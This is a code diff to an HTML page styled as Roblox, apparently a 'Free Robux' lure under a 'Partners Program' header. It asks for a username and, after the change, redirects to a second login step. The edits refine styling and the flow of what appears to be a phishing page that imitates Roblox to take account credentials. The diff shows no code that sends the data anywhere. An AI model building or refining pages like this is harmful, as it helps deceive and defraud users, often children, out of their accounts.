@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Roblox - Free Robux</title>
+    <title>Roblox</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -32,21 +32,21 @@
         }
 
         /* ============================================================
-           HEADER (Partners Program)
+           HEADER : Partners Program | How it works?
            ============================================================ */
         .header-top {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
-            padding: 0 4px;
+            margin-bottom: 32px;
+            padding: 0 2px;
         }
 
         .header-top .partners {
             font-size: 14px;
             font-weight: 600;
             color: #ffffff;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.2px;
         }
 
         .header-top .how-it-works {
@@ -62,14 +62,14 @@
         }
 
         /* ============================================================
-           LOGO ROBLOX (simple)
+           LOGO ROBLOX
            ============================================================ */
         .roblox-logo {
             font-size: 48px;
             font-weight: 900;
             color: #ffffff;
             letter-spacing: -2px;
-            margin-bottom: 12px;
+            margin-bottom: 8px;
         }
 
         .roblox-logo .highlight {
@@ -80,11 +80,11 @@
            TEXTE
            ============================================================ */
         .subtitle {
-            font-size: 15px;
+            font-size: 14px;
             font-weight: 400;
             color: rgba(255, 255, 255, 0.5);
             margin-bottom: 24px;
-            line-height: 1.4;
+            line-height: 1.5;
         }
 
         /* ============================================================
@@ -97,19 +97,19 @@
         .input-group input {
             width: 100%;
             padding: 16px 18px;
-            border: 1.5px solid rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 12px;
             font-size: 15px;
             font-family: 'Inter', sans-serif;
             outline: none;
-            background: rgba(255, 255, 255, 0.04);
+            background: rgba(255, 255, 255, 0.03);
             color: #ffffff;
             transition: all 0.3s ease;
-            text-align: center;
+            text-align: left;
         }
 
         .input-group input::placeholder {
-            color: rgba(255, 255, 255, 0.25);
+            color: rgba(255, 255, 255, 0.2);
             font-weight: 400;
         }
 
@@ -119,8 +119,16 @@
             box-shadow: 0 0 0 4px rgba(29, 185, 84, 0.06);
         }
 
+        .error-msg {
+            color: #ff3b30;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+            text-align: left;
+        }
+
         /* ============================================================
-           BOUTON CONTINUE (vert)
+           BOUTON CONTINUE
            ============================================================ */
         .btn-continue {
             width: 100%;
@@ -145,6 +153,12 @@
 
         .btn-continue:active {
             transform: scale(0.98);
+        }
+
+        .btn-continue:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
         }
 
         .btn-content {
@@ -175,7 +189,7 @@
         @media (max-width: 420px) {
             .container { padding: 0 8px; }
             .roblox-logo { font-size: 38px; }
-            .subtitle { font-size: 14px; }
+            .subtitle { font-size: 13px; }
             .input-group input { font-size: 14px; padding: 14px 16px; }
             .btn-continue { font-size: 15px; padding: 14px; }
             .header-top .partners { font-size: 13px; }
@@ -188,7 +202,7 @@
     <div class="container">
 
         <!-- ============================================================
-        HEADER : Partners Program | How it works?
+        HEADER
         ============================================================ -->
         <div class="header-top">
             <span class="partners">Partners Program</span>
@@ -210,14 +224,12 @@
         </p>
 
         <!-- ============================================================
-        CHAMP + BOUTON
+        FORMULAIRE
         ============================================================ -->
-        <form id="loginForm" style="width:100%;">
+        <form id="loginForm">
             <div class="input-group">
                 <input type="text" id="username" placeholder="Type your username ..." autofocus />
-                <div id="errorMsg" style="color:#ff3b30; font-size:12px; margin-top:6px; display:none; text-align:center;">
-                    Veuillez entrer un nom d'utilisateur valide.
-                </div>
+                <div class="error-msg" id="errorMsg">Veuillez entrer un nom d'utilisateur valide.</div>
             </div>
 
             <button type="submit" class="btn-continue" id="submitBtn">
@@ -250,18 +262,20 @@
 
             errorMsg.style.display = 'none';
 
-            // Désactiver le bouton
             submitBtn.disabled = true;
             btnText.textContent = 'Loading...';
             btnSpinner.style.display = 'block';
 
-            // Simuler l'envoi
+            // Simuler envoi
             setTimeout(() => {
-                alert('Username: ' + username + '\nConnecté avec succès !');
+                // Rediriger vers l'étape 2 (connexion)
+                window.location.href = '?step=login';
+                // ou tu peux faire une alerte pour le test
+                // alert('Username: ' + username + '\nConnexion réussie !');
                 submitBtn.disabled = false;
                 btnText.textContent = 'Continue';
                 btnSpinner.style.display = 'none';
-            }, 1500);
+            }, 1200);
         });
 
         // Effacer l'erreur quand l'utilisateur tape
